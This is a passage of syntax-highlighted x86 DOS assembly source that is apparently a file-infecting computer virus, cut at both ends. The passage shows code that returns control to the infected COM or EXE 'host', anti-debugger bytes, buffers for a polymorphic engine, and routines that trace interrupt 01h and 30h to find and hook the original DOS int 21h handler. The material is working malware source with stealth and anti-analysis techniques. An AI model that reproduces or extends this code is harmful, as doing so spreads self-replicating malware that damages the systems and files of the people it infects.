        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">InicSS</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; SS:SP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">InicSP</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">InicCS</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Put CS onto stack</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">InicIP</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; SI=Initial offset</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">               </span><span class="sc1">; Put SI onto stack</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salll</span><span class="sc0">       </span><span class="sc1">; Recover all registers and execute</span><span class="sc0">
                    </span><span class="sc1">; host</span><span class="sc0">
</span><span class="sc5">Squatter</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">            </span><span class="sc1">; End of installation routine</span><span class="sc0">

</span><span class="sc1">;;; Little DATA section</span><span class="sc0">

</span><span class="sc5">Los3bytes</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">   </span><span class="sc1">; First three bytes in a COM</span><span class="sc0">
</span><span class="sc5">SaltoCOM</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">    </span><span class="sc1">; It is used when constructing the ini-</span><span class="sc0">
                     </span><span class="sc1">; tial JMP in a COM</span><span class="sc0">
</span><span class="sc5">InicIP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Data to execute EXE hosts</span><span class="sc0">
</span><span class="sc5">InicCS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">InicSS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">InicSP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AntInt21h</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; Here real int 21h address is saved</span><span class="sc0">

</span><span class="sc5">Puntero2</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; This is used in the trace routines</span><span class="sc0">
</span><span class="sc5">Puntero3</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;; Procedure to copy (it emulates a REP MOVSB)</span><span class="sc0">

</span><span class="sc5">RepMovsb</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Save AX</span><span class="sc0">
   </span><span class="sc5">@@Loop01</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get byte from DS:SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">; Copy byte to ES:DI</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">   </span><span class="sc1">; Anti-debugger</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; Increase pointers</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@Loop01</span><span class="sc0">      </span><span class="sc1">; Repeat CX times</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Recover AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">RepMovsb</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Used for memory writes for the polymorphic engine</span><span class="sc0">
</span><span class="sc5">Basura4</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Procedure to trace int 21h via int 30h trick</span><span class="sc0">
</span><span class="sc5">TrazaporINT30h</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Get address of 32 bit jump in int 30h in</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; ES:BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">00C1h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">00C3h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">  </span><span class="sc1">; Check if the first two bytes</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SalconCARRY</span><span class="sc0">    </span><span class="sc1">; are a double NOP. If not, exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">; Check if a CALL follows them</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SalconCARRY</span><span class="sc0">    </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0032h</span><span class="sc0">      </span><span class="sc1">; Subtract 32h to get int 21h entrypoint</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">  </span><span class="sc1">; Check if there are two NOPs</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SalconCARRY</span><span class="sc0">      </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">; Does CALL instruction follow</span><span class="sc0">
                         </span><span class="sc1">; them?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SalconCARRY</span><span class="sc0">      </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2EFFh</span><span class="sc0"> </span><span class="sc1">; Is there a CS:JMP FAR...?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SalconCARRY</span><span class="sc0">      </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get address where pointer to</span><span class="sc0">
                          </span><span class="sc1">; int 21h is stored</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc1">; Store it in Puntero3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Load pointer to int 21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">   </span><span class="sc1">; Store it onto</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc1">; "AntInt21h"</span><span class="sc0">
        </span><span class="sc6">CLC</span><span class="sc0">             </span><span class="sc1">; Clear Carry Flag and exit</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">@@SalconCARRY</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STC</span><span class="sc0">             </span><span class="sc1">; Set Carry Flag and exit</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">TrazaporINT30h</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; More words to memory writing on poly engine</span><span class="sc0">
</span><span class="sc5">Basura3</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;;;; New interruption 01h (to trace interrupts)</span><span class="sc0">

</span><span class="sc5">NewInt01h</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">  </span><span class="sc1">; Save going-to-be-used registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">  </span><span class="sc1">; DL=0 (exit with IRET, not RETF)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get current segment</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">       </span><span class="sc1">; Check if it is the virus</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin1</span><span class="sc0">         </span><span class="sc1">; If it is, return from interrupt</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Put segment in DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get IP on SI</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">          </span><span class="sc1">; Load a byte</span><span class="sc0">
        </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">       </span><span class="sc1">; Save SI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Ch</span><span class="sc0">      </span><span class="sc1">; Check if next instruction is PUSHF</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Siguiendo1</span><span class="sc0">   </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Avoid PUSHF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">        </span><span class="sc1">; Set return with RETF</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Acaba</span><span class="sc0">
</span><span class="sc5">@@Siguiendo1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9Dh</span><span class="sc0">      </span><span class="sc1">; Check if next instruction is POPF</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Siguiendo2</span><span class="sc0">   </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0"> </span><span class="sc1">; Set Trap-Flag in stack value</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Acaba</span><span class="sc0">        </span><span class="sc1">; Jump</span><span class="sc0">
</span><span class="sc5">@@Siguiendo2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CFh</span><span class="sc0">     </span><span class="sc1">; Check if next instruction is IRET</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Siguiendo3</span><span class="sc0">   </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0"> </span><span class="sc1">; Set Trap-Flag in stack value</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Acaba</span><span class="sc0">        </span><span class="sc1">; Jump</span><span class="sc0">
</span><span class="sc5">@@Siguiendo3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">      </span><span class="sc1">; Check if next instruction is CS:</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Siguiendo4</span><span class="sc0">   </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">LODSW</span><span class="sc0">            </span><span class="sc1">; Load next two bytes in AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Siguiendo5</span><span class="sc0">
</span><span class="sc5">@@Siguiendo4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; Load next byte in AH</span><span class="sc0">
        </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc5">@@Siguiendo5</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2EFFh</span><span class="sc0">    </span><span class="sc1">; Check if a JMP FAR follows</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@EsJMPFAR</span><span class="sc0">     </span><span class="sc1">; If it is, jump to @@EsJMPFAR</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1EFFh</span><span class="sc0">    </span><span class="sc1">; Check if a CALL FAR follows</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@EsJMPFAR</span><span class="sc0">     </span><span class="sc1">; If it is, jump to @@EsJMPFAR</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">     </span><span class="sc1">; Check if a JMP ????:???? follows</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@EsJMP32</span><span class="sc0">      </span><span class="sc1">; If it is, jump to @@EsJMP32</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09Ah</span><span class="sc0">     </span><span class="sc1">; Check if a CALL ????:???? follows</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Acaba</span><span class="sc0">        </span><span class="sc1">; If it isn't, end</span><span class="sc0">
</span><span class="sc5">@@EsJMP32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">       </span><span class="sc1">; Decrement SI to get address of JMP/CALL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">  </span><span class="sc1">; Save address on Puntero2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Acaba</span><span class="sc0">        </span><span class="sc1">; Jump</span><span class="sc0">
</span><span class="sc5">@@EsJMPFAR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LODSW</span><span class="sc0">            </span><span class="sc1">; Get memory index</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Save address on Puntero2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">

</span><span class="sc5">@@Acaba</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">       </span><span class="sc1">; Recover SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">       </span><span class="sc1">; Put current segment in AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0"> </span><span class="sc1">; Check if BIOS</span><span class="sc0">
                                   </span><span class="sc1">; or DMA</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">   </span><span class="sc5">@@Fin1</span><span class="sc0">         </span><span class="sc1">; If it's BIOS or DMA, we've got it</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Compare this seg-</span><span class="sc0">
                           </span><span class="sc1">; ment with stored one</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin1</span><span class="sc0">         </span><span class="sc1">; If it is the same, end</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000h</span><span class="sc0">   </span><span class="sc1">; Is segment allow or equal to BIOS seg.?</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">   </span><span class="sc5">@@Salto</span><span class="sc0">        </span><span class="sc1">; If it is, jump</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Compare segment</span><span class="sc0">
                            </span><span class="sc1">; with stored one</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">    </span><span class="sc5">@@Fin1</span><span class="sc0">        </span><span class="sc1">; If it's greater, end</span><span class="sc0">
 </span><span class="sc5">@@Salto</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; Decrement SI to get current CS:IP in</span><span class="sc0">
                    </span><span class="sc1">; AX:SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Save AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Save in Puntero3 the address</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; on Puntero2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Recover AX</span><span class="sc0">
